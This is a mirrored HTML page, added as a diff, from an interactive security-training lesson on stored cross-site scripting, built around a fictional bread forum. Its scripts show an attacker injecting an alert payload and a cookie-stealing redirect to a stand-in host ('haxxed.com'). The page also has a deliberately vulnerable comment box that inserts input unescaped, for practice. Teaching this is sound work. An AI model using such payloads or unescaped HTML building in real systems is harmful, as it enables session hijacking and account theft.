@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from www. .com/exercises/xss-stored by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 03 Aug 2023 12:47:05 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+
+  <title>Cross-site Scripting</title>
+
+  <link rel="shortcut icon" type="image/x-icon" href="https://d1o5lmfp4gliop.cloudfront.net/assets/favicon-d2fd4b2666fd6a6c2eacee13d0d844a558942079e549b7f971085de9cab55511.ico" />
+
+  <link rel="apple-touch-icon"                 href="../touch-icon-iphone.png">
+  <link rel="apple-touch-icon" sizes="76x76"   href="../touch-icon-ipad.png">
+  <link rel="apple-touch-icon" sizes="120x120" href="../touch-icon-iphone-retina.png">
+  <link rel="apple-touch-icon" sizes="152x152" href="../touch-icon-ipad-retina.png">
+
+  <meta name="viewport" content="width=device-width">
+
+  <link rel="stylesheet" media="all" href="../../d1o5lmfp4gliop.cloudfront.net/assets/application-1f27c21e9caba5e224e9039708363bb3d6393bcd0cec34182ef97d314c3d7fe1.css" />
+  <script src="../../d1o5lmfp4gliop.cloudfront.net/assets/application-9865c3a61c1ffdfed4986c79c8214c39119b9dd0fa2157ea9bdc023c8edbd459.js"></script>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="A19nc7qra51sDo9sjl8d2UfQIL980VCXQC2DAjBKT2uaT+pBO/ELo6EgAuUh52c+o2m0kWleTV4jWedTckEXmA==" />
+
+  
+
+  <meta property="og:url"          content="https://www. .com/exercises/xss-stored" />
+<meta property="og:type"         content="website" />
+<meta property="og:title"        content="Cross-site Scripting" />
+<meta property="og:description"  content="If your site allows users to add content, you need to be sure that attackers cannot inject malicious JavaScript. One method of doing this is called cross-site scripting (XSS). Let&#39;s see how an attacker could take advantage of cross-site scripting. →" />
+<meta property="og:image"        content="https://www. .comhttps://d1o5lmfp4gliop.cloudfront.net/images/exercises/xss-stored/screenshot.png" />
+<meta property="og:site_name"    content=" "/>
+
+<meta property="fb:app_id"       content="495778420623064">
+
+<meta name="description"         content="If your site allows users to add content, you need to be sure that attackers cannot inject malicious JavaScript. One method of doing this is called cross-site scripting (XSS). Let&#39;s see how an attacker could take advantage of cross-site scripting. →" />
+
+<meta name="twitter:title"       content="Cross-site Scripting">
+<meta name="twitter:description" content="If your site allows users to add content, you need to be sure that attackers cannot inject malicious JavaScript. One method of doing this is called cross-site scripting (XSS). Let&#39;s see how an attacker could take advantage of cross-site scripting. → %>">
+
+<meta name="application-name"                content=" "/>
+<meta name="msapplication-TileColor"         content="#000000"/>
+<meta name="msapplication-square70x70logo"   content="windows-tiny.png"/>
+<meta name="msapplication-square150x150logo" content="windows-square.png"/>
+<meta name="msapplication-wide310x150logo"   content="windows-wide.png"/>
+<meta name="msapplication-square310x310logo" content="windows-large.png"/>
+
+
+  
+
+
+
+</head>
+
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-SZ91HC6JB6"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-SZ91HC6JB6');
+  </script>
+
+
+
+<body class="white logged-out exercises xss_stored unknown_device unknown_browser unknown_browser0 windows non-ie">
+
+  <div class="content">
+
+
+      
+  <div class="exercise-title">
+    <a href="#">
+      <div class="inline">
+        <img class="logo" src="../../d1o5lmfp4gliop.cloudfront.net/images/exercises/xss-stored/icon.gif" />
+      </div>
+
+      <div class="inline title">
+        <div>
+          Cross-site Scripting
+        </div>
+        <div class="tracking"></div>
+      </div>
+
+      <a class="back-to-lessons" href="../lessons.html">
+        <i class="fa fa-times-circle back-icon"></i>
+        <div class="back-label">Exit</div>
+</a>    </a>
+  </div>
+
+
+    <noscript>
+  <div class="row">
+    <p class="alert alert-danger no-script">
+      This site needs JavaScript to work!
+    </p>
+  </div>
+</noscript>
+
+    <div class="main exercise">
+
+      <div class="card-holder">
+        <div id="intro" class="intro">
+          <a id="start-exercise" href="#start">
+            <div class="card">
+
+  <div class="img porthole" style="background-color: white; background-position: center; background-repeat: no-repeat; background-image: url('../../d1o5lmfp4gliop.cloudfront.net/images/exercises/xss-stored/icon.gif')"></div>
+
+  <div class="strip">
+    Cross-site Scripting
+  </div>
+  <div class="blurb">
+
+    <p>If your site allows users to add content, you need to be sure that attackers cannot inject malicious JavaScript. One method of doing this is called cross-site scripting (XSS).</p>
+
+    <p>
+      <strong>
+        Let's see how an attacker could take advantage of cross-site scripting.
+      </strong>
+    </p>
+
+  </div>
+</div>
+
+          </a>
+        </div>
+      </div>
+
+      <div class="lesson-holder">
+        <div class="lesson"
+             data-name="Cross-site Scripting"
+             data-id="xss_stored"
+             data-captions="on" >
+
+          
+        <script>
+  function userTyping(user, target, text, secondaryTarget, andThen) {
+    // Reset any data typed.js has cached.
+    $(target).data('typed', null);
+
+    if (!isScrolledIntoView(target)) {
+      $.smoothScroll({ scrollTarget: target, offset: -50 });
+    }
+
+    $(target).typed({
+      strings: [ text ],
+      typeSpeed: 20,
+      startDelay: 500,
+      contentType: 'text',
+      showCursor: false,
+      onStringTyped: function () {
+        setTimeout(function () {
+          $(target).text("");
+
+          $.when(
+            $(secondaryTarget).fadeIn()
+          ).done(function(){
+            $.when(
+               $(".comments").animate({ scrollTop: 1000 }, 1000)
+            ).done(function() {
+              if (andThen) {
+                andThen();
+              }
+              else {
+                done();
+              }
+            });
+          });
+        }, 1000)
+      }
+    });
+  }
+
+  function unescapeHTML(html){
+    return html.replace("&lt;", "<").replace("&gt;", ">").replace("&lt;", "<").replace("&gt;", ">");
+  }
+</script>
+
+<div id="xss-stored" class="container">
+  <div class="row top min-height hide-on-screencast">
+    <div class="col-md-3"></div>
+
+    <div class="col-md-6">
+      <div>
+
+        <a class="unselectable" href="#loafing-about"><div id="start" class=" instruction" show="#good-breddit,#vic-baking" title="Start" next="loafing-about">
+
+          Imagine you are the owner of <strong>breddit.com</strong>, the number one social
+          media site for the baking industry. You have an avid community of commenters
+          who love sharing their bread knowledge.
+
+<div class="next"></div></div></a>
+        <a class="unselectable" href="#crumby-behaviour"><div id="loafing-about" class=" instruction" show="#good-breddit,#vic-baking" title="Loafing About" triggerOnClick="vicComments" fx="typing" next="crumby-behaviour">
+
+          Because the main use of your website is to facilitate discussion, users
+          can add comments, which are saved to the database and displayed to other
+          users.
+
+<div class="next"></div></div></a>
+        <script>
+          function vicComments() {
+            animating();
+            userTyping(
+              "#vic",
+              "#good-breddit .input .comment",
+              "I love it so much, I think I might be part duck.",
+              ".comment-1");
+          }
+        </script>
+
+        <a class="unselectable" href="#on-a-roll"><div id="crumby-behaviour" class=" instruction" show="#good-breddit,#bad-breddit,#vic-baking,#mal-preparing" title="Crumby Behaviour" next="on-a-roll">
+
+          Unfortunately the popularity of your site has also attracted the attention
+          of hackers, who want to access your site for nefarious purposes.
+
+<div class="next"></div></div></a>
+        <a class="unselectable" href="#yeast-of-your-problems"><div id="on-a-roll" class=" instruction" show="#good-breddit,#bad-breddit,#vic-baking,#mal-preparing,.comment-1" title="On a Roll" fx="none" next="yeast-of-your-problems">
+
+          Unless you are careful when constructing the HTML, hackers can abuse
+          the comment function by injecting JavaScript.
+
+<div class="next"></div></div></a>
+        <a class="unselectable" href="#you-are-toast"><div id="yeast-of-your-problems" class=" instruction" show="#good-breddit,#bad-breddit,#vic-baking,#mal-preparing,.comment-1" title="Yeast of Your Problems" triggerOnClick="malAttacks" fx="typing" next="you-are-toast">
+
+          Watch how <strong>Mal</strong> injects some malicious JavaScript.
+
+<div class="next"></div></div></a>
+        <script>
+          function malAttacks() {
+            animating();
+
+            $("#mal-preparing").hide();
+            $("#mal-hacking").show();
+
+            userTyping(
+              "#mal",
+              "#bad-breddit .input .comment",
+              unescapeHTML("&lt;script&gt;alert('Your croissants are limp and sad.')&lt;/script&gt;"),
+              ".comment-2",
+              function() {
+                  sounds.play('plink')
+                  alert("Your croissants are limp and sad.");
+
+                setTimeout(function() {
+                  thinks("#thats-rude");
+                  done();
+
+                  if (!isScrolledIntoView("#vic-baking")) {
+                    $.smoothScroll({ scrollTarget: "#vic-baking", offset: -50 });
+                  }
+
+                }, 1000);
+              });
+          };
+        </script>
+
+        <a class="unselectable" href="#you-try"><div id="you-are-toast" class=" instruction" show="#good-breddit,#bad-breddit,#vic-baking,#mal-hacking,.comment-1,.comment-2" title="You&#39;re Toast" triggerOnClick="malAttacksAgain" fx="typing" next="you-try">
+
+          A real attack might use cross-site scripting to steal another user's cookie,
+          which can permit session hijacking.
+
+<div class="next"></div></div></a>
+        <a class="unselectable" href="#finish"><div id="you-try" class=" instruction" show="#vulnerable-breddit" title="Gaming the System" trigger="putCursorBetweenScriptTags" transcript="Now let&#39;s try ourselves. We will inject a script tag to call the upvote() function whenever the page is viewed." next="finish" await="true">
+
+          <strong>Now you try.</strong> Inject a script tag to call the
+          <code>upvote()</code> function whenever the page is viewed.
+
+<div class="next hidden"></div></div></a>
+        <a class="unselectable" href="../prevention/xss-stored.html"><div id="finish" class=" instruction" title="Crumbs!">
+
+          <div class="icon">
+            <img src="../../d1o5lmfp4gliop.cloudfront.net/assets/skull-56af21599bf07cebbffbecceec1537a9471628fb1d3374433c1d9b8b1ab703bf.png" />
+          </div>
+
+          <div class="message">
+            We'd better learn how to protect against cross-site scripting then.
+          </div>
+
+<div class="next"></div></div></a>
+        <script>
+          function malAttacksAgain() {
+            animating();
+            userTyping(
+              "#mal",
+              "#bad-breddit .input .comment",
+              unescapeHTML("&lt;script&gt;window.location = 'haxxed.com?cookie=' + document.cookie&lt;/script&gt;"),
+              ".comment-3",
+              function() {
+
+                if (!isScrolledIntoView("#vic-baking")) {
+                  $.smoothScroll({ scrollTarget: "#vic-baking", offset: -50 });
+                }
+
+                $("#hacked").show();
+                sounds.play('scratch')
+
+                $("#good-breddit .address").text("haxxed.com?cookie=DFjkhlaa80af0j0a9efjli3aw900dvjlkzvlkj9a")
+                setTimeout(function() {
+                  $("#vic-baking").hide();
+                  $("#vic-baking-hacked").show();
+
+                  $("#mal-hacking").hide();
+                  $("#mal-succeed").show();
+
+                  thinks("#oh-no");
+                  done();
+
+                }, 1000);
+              });
+          };
+        </script>
+
+      </div>
+
+    </div>
+
+    <div class="col-md-3"></div>
+  </div>
+
+  <div class="row bottom">
+    <div class="col-md-2 left-panel">
+      <span id="thats-rude" character="" class="thought-bubble hide-by-default" animation="bubble">
+  <div class="bubble thinks">
+    
+        Rude.
+
+  </div>
+
+  <div class="bubble first">  </div>
+  <div class="bubble second"> </div>
+  <div class="bubble third">  </div>
+</span>
+      <span id="oh-no" character="" class="thought-bubble hide-by-default" animation="bubble">
+  <div class="bubble thinks">
+    
+        That's not good.
+
+  </div>
+
+  <div class="bubble first">  </div>
+  <div class="bubble second"> </div>
+  <div class="bubble third">  </div>
+</span>
+      <div id="vic-baking" class="character hide-by-default" animation="fade">
+        <img src="../../d1o5lmfp4gliop.cloudfront.net/assets/flynn/vic-baking-775096dc6d872f132bd52810244babe8bd4202e822302b66cfdbe95c0b25fb90.png" />
+      </div>
+
+      <div id="vic-baking-hacked" class="character hide-by-default" animation="fade">
+        <img src="../../d1o5lmfp4gliop.cloudfront.net/assets/flynn/vic-baking-hacked-f0702b389ec9c7784c375be7e116c30080a96f7d121fe4f1a1b33a54f50ea264.png" />
+      </div>
+    </div>
+
+    <div class="col-md-4">
+      <div id="good-breddit"
+     class="browser hide-by-default"
+     animation="slide-right">
+  <div class="nav">
+    <span class="buttons">
+      <span class="button red">    </span>
+      <span class="button orange"> </span>
+      <span class="button green">  </span>
+    </span>
+    <div class="url">
+      <div class="address">breddit.com/r/comments/how_much_do_you_like_bread/</div>
+      <div class="load-icon"></div>
+    </div>
+  </div>
+  <div class="frame">
+
+    
+
+        <div class="breddit">
+          <div class="heading">
+            <img src="../../d1o5lmfp4gliop.cloudfront.net/assets/exercises/xss-stored/bread-185a89839a7f3029f567037088539633ec259d6e1f7abc01ff5bf8375cd95be6.png" />
+            <h1>breddit</h1>
+          </div>
+          <div class="question">
+            <div>
+              <h1>How much do you folks like bread?</h1>
+            </div>
+          </div>
+          <div class="comments">
+            <div class="comment">
+              <div class="author">roll_with_it</div>
+              <div class="text">I dream of baking tins.</div>
+            </div>
+            <div class="comment comment-1" style="display: none">
+              <div class="author">I_knead_you_right_now</div>
+              <div class="text">I love it so much, I think I might be part duck.</div>
+            </div>
+            <div class="comment hide-by-default comment-2">
+              <div class="author">butter_you_than_me</div>
+              <div class="text">...</div>
+            </div>
+            <div class="comment hide-by-default comment-3">
+              <div class="author">butter_you_than_me</div>
+              <div class="text">...</div>
+            </div>
+          </div>
+          <div class="input">
+            <div class="comment">
+            </div>
+          </div>
+        </div>
+
+        <div id="hacked" class="hide-by-default">
+          <img src="../../d1o5lmfp4gliop.cloudfront.net/assets/haxxed-4-76a53f55f9313520fdb15102227077999bbb568eadee356577b9c10008d49347.gif" />
+        </div>
+
+
+
+  </div>
+</div>    </div>
+
+    <div class="col-md-4">
+      <div id="bad-breddit"
+     class="browser hide-by-default"
+     animation="slide-left">
+  <div class="nav">
+    <span class="buttons">
+      <span class="button red">    </span>
+      <span class="button orange"> </span>
+      <span class="button green">  </span>
+    </span>
+    <div class="url">
+      <div class="address">breddit.com/r/comments/how_much_do_you_like_bread/</div>
+      <div class="load-icon"></div>
+    </div>
+  </div>
+  <div class="frame">
+
+    
+
+        <div class="breddit">
+          <div class="display: table-row">
+            <div class="heading">
+              <img src="../../d1o5lmfp4gliop.cloudfront.net/assets/exercises/xss-stored/bread-185a89839a7f3029f567037088539633ec259d6e1f7abc01ff5bf8375cd95be6.png" />
+              <h1>breddit</h1>
+            </div>
+            <div class="question">
+              <div>
+                <h1>How much do you folks like bread?</h1>
+              </div>
+            </div>
+          </div>
+
+          <div class="comments">
+            <div class="comment">
+              <div class="author">roll_with_it</div>
+              <div class="text">I dream of baking tins.</div>
+            </div>
+            <div class="comment comment-1">
+              <div class="author">I_knead_you_right_now</div>
+              <div class="text">I love it so much, I think I might be part duck.</div>
+            </div>
+            <div class="comment hide-by-default comment-2">
+              <div class="author">butter_you_than_me</div>
+              <div class="text">...</div>
+            </div>
+            <div class="comment hide-by-default comment-3">
+              <div class="author">butter_you_than_me</div>
+              <div class="text">...</div>
+            </div>
+          </div>
+          <div class="input">
+            <div class="comment">
+            </div>
+          </div>
+        </div>
+
+
+
+  </div>
+</div>    </div>
+
+    <div class="col-md-2 right-panel">
+      <div id="mal-preparing" class="character hide-by-default" animation="fade">
+        <img src="../../d1o5lmfp4gliop.cloudfront.net/assets/flynn/mal-preparing-06c19221aa11811471e37995f4a4ae85b601d7ce2a85005cbd74bbdabf2112a3.png" />
+      </div>
+
+      <div id="mal-hacking" class="character hide-by-default" animation="fade">
+        <img src="../../d1o5lmfp4gliop.cloudfront.net/assets/flynn/mal-hacking-c3cda4bec0235fcfe36c50e49ef7a01aba5e01ea4c9448217b2fbaa268c52d12.png" />
+      </div>
+
+      <div id="mal-succeed" class="character hide-by-default" animation="fade">
+        <img src="../../d1o5lmfp4gliop.cloudfront.net/assets/flynn/mal-succeed-e1a6deb1c9d0b37eaae079dcbd6e0333626bf85cdd89fb8069a6d1654215b3ab.png" />
+      </div>
+    </div>
+  </div>
+
+  <div class="row bottom">
+
+    <div class="col-md-3"></div>
+
+    <div class="col-md-6">
+
+      <div id="vulnerable-breddit"
+     class="browser hide-by-default"
+     >
+  <div class="nav">
+    <span class="buttons">
+      <span class="button red">    </span>
+      <span class="button orange"> </span>
+      <span class="button green">  </span>
+    </span>
+    <div class="url">
+      <div class="address">breddit.com/</div>
+      <div class="load-icon"></div>
+    </div>
+  </div>
+  <div class="frame">
+
+    
+
+        <div class="breddit smaller">
+          <div class="heading">
+            <img src="../../d1o5lmfp4gliop.cloudfront.net/assets/exercises/xss-stored/bread-185a89839a7f3029f567037088539633ec259d6e1f7abc01ff5bf8375cd95be6.png" />
+            <h1>breddit</h1>
+          </div>
+          <div class="question upvote-question">
+            <div class="votes">
+              <div class="upvote">
+                <span class="fa fa-arrow-up"></span>
+              </div>
+              <div class="downvote">
+                <span class="fa fa-arrow-down"></span>
+              </div>
+            </div>
+            <h1 style="padding-top: 10px">Your Loaves Are Soggy and Undercooked</h1>
+          </div>
+          <div class="comments">
+            <div class="comment">
+              <div class="author">roll_with_it</div>
+              <div class="text">That's mean. Why would you say that?</div>
+            </div>
+          </div>
+          <textarea class="input comment-box" autocorrect="off" autocapitalize="none"></textarea>
+        </div>
+
+
+
+  </div>
+</div>
+    </div>
+
+    <script>
+      var upvoted = false;
+
+      function upvote() {
+        upvoted = true;
+
+        sounds.play('error')
+
+        if (!isScrolledIntoView(".upvote")) {
+          $.smoothScroll({ scrollTarget: ".upvote", offset: -50 });
+        }
+
+        $(".upvote-question").addClass('upvoting');
+
+        $(".current")
+          .html("<strong>Easy right?</strong> Now this post will get upvoted whenever a user looks at it.")
+          .removeClass("waiting")
+          .removeAttr("await")
+          .append('<div class="next"></div>');
+
+        track("exercise", $(".lesson").data('id'), 8, 8);
+      }
+    </script>
+
+    <script>
+      $(function() {
+        var input = $("#vulnerable-breddit .comment-box");
+
+        var lt = '<';
+        var gt = '>';
+
+        input.val(lt + 'script' + gt + lt + '/script' + gt);
+
+        input.keydown(function(event) {
+          if (event.which == 13) {
+            var script = input.val()
+
+            if (script.startsWith(lt + "script") && script.endsWith("script" + gt)) {
+              script = lt + 'script' + gt +
+                       'try {' + script.substring(8, script.length - 9) + '} catch (e) { }' +
+                       lt + '/script' + gt;
+            }
+
+            $("#vulnerable-breddit .comments").append(
+              '<div class="comment"> <div class="author">dough_boy</div><div class="text">' + script + '</div></div>'
+            );
+
+            setTimeout(function() {
+              if (upvoted) {
+                input.val('')
+              }
+              else {
+                input.val(lt + 'script' + gt + lt + '/script' + gt);
+
+                // Nudge them in the right direction.
+                $(".current").html("Enter the text <code>&lt;script&gt;<b>upvote()</b>&lt;script/&gt;</code> ")
+              }
+            }, 100)
+
+            return false
+          }
+        })
+      })
+
+      function putCursorBetweenScriptTags() {
+        setTimeout(function() {
+          $("#vulnerable-breddit .comment-box")[0].focus();
+          $("#vulnerable-breddit .comment-box")[0].setSelectionRange(8, 8);
+        }, 500)
+      }
+    </script>
+
+    <div class="col-md-3"></div>
+
+  </div>
+</div>
+
+
+
+        </div>
+
+
+          
+
+
+
+
+      </div>
+
+    </div>
+
+
+    <script src="../../d1o5lmfp4gliop.cloudfront.net/assets/exercise-5652b5b649e3d7688a1c4e39179541168716b52f4d2d6c72ea0210af3eebe078.js"></script>
+
+
+
+
+
+
+  </div>
+
+    <script src="../../d1o5lmfp4gliop.cloudfront.net/assets/cookieinfo-1af9cc137c2c2bc8ea4d469f45d357ec43dc6c23537bd0c96aa9b51ff416ce5e.js" id="cookieinfo"></script>
+
+</body>
+
+<script>
+  $(function () {
+    $('[data-bs-toggle="tooltip"]').tooltip({ container: 'body' });
+  });
+</script>
+
+
+<!-- Mirrored from www. .com/exercises/xss-stored by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 03 Aug 2023 12:47:06 GMT -->
+</html>
